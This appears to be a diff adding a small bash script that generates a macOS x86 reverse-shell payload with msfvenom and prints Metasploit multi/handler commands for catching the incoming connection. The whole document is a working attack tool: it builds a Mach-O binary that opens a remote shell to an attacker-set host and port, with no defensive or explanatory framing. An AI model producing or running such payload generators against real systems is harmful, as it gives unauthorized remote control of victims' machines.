@@ -1,0 +1,13 @@
+#!/bin/bash
+# platform OSX
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=$myip LPORT=$openport -f macho --platform osx -a x86 -b "\x00" R > ops;
+echo ''
+echo 'run:'
+echo 'msfconsole'
+echo 'use multi/handler'
+echo 'set LHOST <myip>'
+echo 'set LPORT <openport>'
+echo 'set payload osx/x86/shell_reverse_tcp'
+echo 'exploit'
+echo '..wait for connection..'
+echo ''
